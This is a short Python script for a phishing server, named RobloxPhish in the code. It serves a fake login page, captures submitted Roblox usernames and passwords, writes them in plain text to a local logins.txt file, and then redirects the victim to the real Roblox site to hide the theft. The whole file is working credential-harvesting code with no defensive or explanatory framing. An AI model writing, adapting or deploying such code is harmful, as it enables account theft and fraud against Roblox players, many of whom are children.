from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class RobloxPhish(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            with open("index.html", "r") as file:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(file.read().encode())
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == "/login":
            content_len = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_len)
            data = urllib.parse.parse_qs(post_data.decode())

            username = data.get("username", [""])[0]
            password = data.get("password", [""])[0]

            with open("logins.txt", "a") as log:
                log.write(f"Username: {username}, Password: {password}\n")

            self.send_response(302)
            self.send_header('Location', 'https://www.roblox.com/')
            self.end_headers()

if __name__ == "__main__":
    print("Server running at http://localhost:8000")
    HTTPServer(("", 8000), RobloxPhish).serve_forever()
